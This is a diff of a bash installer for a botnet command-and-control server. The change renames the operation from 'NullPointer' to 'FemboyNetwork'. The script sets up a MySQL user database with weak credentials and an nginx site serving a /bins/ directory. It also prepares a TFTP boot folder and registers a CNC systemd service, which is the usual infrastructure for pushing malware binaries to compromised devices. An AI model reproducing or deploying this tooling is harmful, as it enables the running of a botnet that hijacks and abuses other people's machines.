@@ -2,18 +2,18 @@
 
 set -e
 
-INSTALL_DIR="/opt/nullpointer"
-CONFIG_DIR="/etc/nullpointer"
+INSTALL_DIR="/opt/fnbnet"
+CONFIG_DIR="/etc/fnbnet"
 
-echo "[*] NullPointer CNC setup"
+echo "[*] FemboyNetwork CNC setup"
 
 apt-get update
 apt-get install -y mysql-server nginx xinetd tftpd-hpa
 
 systemctl start mysql 2>/dev/null || systemctl start mariadb 2>/dev/null || true
-mysql -e "CREATE DATABASE IF NOT EXISTS NullPointer;" 2>/dev/null || true
-mysql -e "CREATE USER IF NOT EXISTS 'nullpointer'@'localhost' IDENTIFIED BY 'nullpointer'; GRANT ALL ON NullPointer.* TO 'nullpointer'@'localhost'; FLUSH PRIVILEGES;" 2>/dev/null || true
-mysql NullPointer -e "
+mysql -e "CREATE DATABASE IF NOT EXISTS FemboyNetwork;" 2>/dev/null || true
+mysql -e "CREATE USER IF NOT EXISTS 'fnbnet'@'localhost' IDENTIFIED BY 'fnbnet'; GRANT ALL ON FemboyNetwork.* TO 'fnbnet'@'localhost'; FLUSH PRIVILEGES;" 2>/dev/null || true
+mysql FemboyNetwork -e "
 CREATE TABLE IF NOT EXISTS users (
   id INT AUTO_INCREMENT PRIMARY KEY,
   username VARCHAR(32),
@@ -35,14 +35,14 @@ mkdir -p "$CONFIG_DIR"
 cp -f cnc/config.json "$INSTALL_DIR/" 2>/dev/null || cp -f config.json "$INSTALL_DIR/" 2>/dev/null || true
 
 mkdir -p /var/www/html/bins
-cat > /etc/nginx/sites-available/nullpointer << 'NGX'
+cat > /etc/nginx/sites-available/fnbnet << 'NGX'
 server {
     listen 80 default_server;
     root /var/www/html;
     location /bins/ { }
 }
 NGX
-ln -sf /etc/nginx/sites-available/nullpointer /etc/nginx/sites-enabled/ 2>/dev/null || true
+ln -sf /etc/nginx/sites-available/fnbnet /etc/nginx/sites-enabled/ 2>/dev/null || true
 systemctl reload nginx 2>/dev/null || true
 
 mkdir -p /var/lib/tftpboot
@@ -53,8 +53,8 @@ echo 'MYSQL_ADDR=127.0.0.1:3306
 MYSQL_USER=root
 MYSQL_PASS=root' > "$CONFIG_DIR/cnc.env"
 
-cp -f "$(dirname "$0")/nullpointer-cnc.service" /etc/systemd/system/ 2>/dev/null || cp nullpointer-cnc.service /etc/systemd/system/
+cp -f "$(dirname "$0")/fnbnet-cnc.service" /etc/systemd/system/ 2>/dev/null || cp fnbnet-cnc.service /etc/systemd/system/
 systemctl daemon-reload
-systemctl enable nullpointer-cnc
+systemctl enable fnbnet-cnc
 
-echo "[*] setup done. copy cnc binary to $INSTALL_DIR/cnc, bins to /var/www/html/bins, then: systemctl start nullpointer-cnc"
+echo "[*] setup done. copy cnc binary to $INSTALL_DIR/cnc, bins to /var/www/html/bins, then: systemctl start fnbnet-cnc"
